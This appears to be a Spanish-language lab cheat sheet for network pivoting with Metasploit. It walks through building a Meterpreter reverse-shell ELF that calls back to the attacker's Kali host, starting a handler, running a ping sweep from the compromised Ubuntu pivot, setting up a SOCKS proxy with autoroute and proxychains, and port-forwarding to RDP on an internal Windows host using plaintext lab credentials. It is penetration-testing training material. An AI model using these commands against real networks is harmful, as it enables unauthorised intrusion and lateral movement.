# Host / Contexto Comando Qué hace
— Fase 1: Generar y recibir payload Meterpreter —
1 Kali · terminal
msfvenom -p linux/x64/meterpreter/reverse_tcp \ LHOST=10.10.14.18 LPORT=8080 \ -f elf -o backupjob
-p payload · LHOST IP de Kali (tun0) · LPORT puerto de escucha · -f elf formato binario Linux · -o archivo de salida
Genera el payload ELF que el Ubuntu ejecutará. Al correr, conectará de vuelta a Kali:8080 y abrirá sesión Meterpreter.
2 msfconsole
use exploit/multi/handler set lhost 0.0.0.0 set lport 8080 set payload linux/x64/meterpreter/reverse_tcp run
0.0.0.0 escucha en todas las interfaces · payload debe coincidir exactamente con el de msfvenom
Levanta el listener en Kali que recibirá la conexión del payload cuando Ubuntu lo ejecute.
3 Ubuntu · shell
chmod +x backupjob && ./backupjob
chmod +x da permiso de ejecución al binario · Requiere haber transferido el archivo antes (scp/wget)
Ejecuta el payload en el pivot. Inicia la conexión TCP hacia Kali:8080 y, si el handler ya está escuchando, abre la sesión Meterpreter.
4 msfconsole output
[*] Meterpreter session 1 opened (10.10.14.18:8080 → 10.129.202.64:XXXXX) meterpreter > pwd
 Confirmación de sesión abierta. pwd verifica que estamos en el sistema Ubuntu (/home/ubuntu).
— Fase 2: Reconocimiento de red interna —
5 meterpreter (en Ubuntu)
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
Módulo post/ → se ejecuta EN el host comprometido (Ubuntu), no en Kali. No necesita proxychains ni autoroute previo.
Ubuntu hace ping sweep a toda la red interna /23 y reporta los hosts activos. Descubrimos 172.16.5.19 (Windows).
— Fase 3: Configurar SOCKS proxy y autoroute —
6 msfconsole (bg primero)
background ← desde meterpreter use auxiliary/server/socks_proxy set SRVPORT 9050 set SRVHOST 0.0.0.0 set version 4a run
background (o bg) deja la sesión Meterpreter activa sin cerrarla. version 4a = SOCKS4a, compatible con proxychains por defecto.
Levanta un servidor SOCKS en Kali:9050 que usa el routing de Metasploit para canalizar tráfico hacia la red interna.
7 msfconsole
jobs
 Verifica que el módulo socks_proxy esté corriendo como job en background. Debe aparecer en la lista de jobs activos.
8 Kali · editor/root
# /etc/proxychains.conf socks4 127.0.0.1 9050
Editar con nano /etc/proxychains.conf. Cambiar/confirmar la última línea. socks4 (sin "a") en proxychains → funciona con SOCKS4a del servidor.
Apunta proxychains al SOCKS proxy local. Ahora cualquier herramienta precedida de proxychains irá por el túnel Meterpreter → Ubuntu → red interna.
9 msfconsole
use post/multi/manage/autoroute set SESSION 1 set SUBNET 172.16.5.0 run # Alternativa desde meterpreter: run autoroute -s 172.16.5.0/23
SESSION 1 especifica qué sesión Meterpreter usar como salida. Agrega la ruta a la tabla interna de MSF (no al OS). Usar /23 cubre 172.16.4.0–172.16.5.255.
Dice a Metasploit: "para llegar a 172.16.5.0/23, usa la sesión Meterpreter 1". Esto hace funcionar el SOCKS proxy hacia esa subred.
— Fase 4: Usar el túnel (proxychains) —
10 Kali · terminal
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
-sT TCP connect (único que funciona por SOCKS) · -Pn no ping (ICMP no pasa por SOCKS) · -n sin DNS (opcional, acelera) · sin -sS ni -sn
Escanea el puerto 3389 de Windows a través del túnel. Confirma que RDP está abierto en el target interno.
— Fase 5: Port Forward local (sin proxychains) —
11a meterpreter (en Ubuntu)
portfwd add -l 3300 -p 3389 -r 172.16.5.19
-l 3300 puerto local en Kali · -p 3389 puerto destino en el target · -r 172.16.5.19 IP del host destino (interno)
Meterpreter abre el puerto 3300 en Kali. Cualquier conexión a localhost:3300 se reenvía automáticamente a 172.16.5.19:3389 por el túnel.
11b Kali · terminal
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
/v:localhost:3300 conecta al forward local (Kali). No necesita proxychains — el portfwd ya encapsula el tráfico internamente.
Abre sesión RDP al Windows a través del port forward. xfreerdp cree que habla con localhost pero en realidad llega a 172.16.5.19.
— Verificación —
12 Kali · terminal
netstat -antp
-a todos los sockets · -n IPs numéricas · -t solo TCP · -p muestra proceso
Muestra los puertos activos en Kali. Debe verse :8080 (handler), :9050 (SOCKS) y :3300 (portfwd) escuchando — confirma que todo el stack está activo.
Leyenda de contextos
Kali · terminal — Shell bash en la máquina atacante
msfconsole — Prompt msf6 > dentro de Metasploit
meterpreter (en Ubuntu) — Prompt meterpreter > — el código corre en Ubuntu
Ubuntu · shell — Shell SSH o acceso directo en el pivot
★ Regla clave: Los módulos post/multi/gather/ping_sweep y similares se ejecutan en el host comprometido (Ubuntu), no en Kali — por eso no necesitan proxychains. El prompt meterpreter > es el agente corriendo en el pivote. Los comandos con proxychains sí corren en Kali pero su tráfico viaja por el túnel.
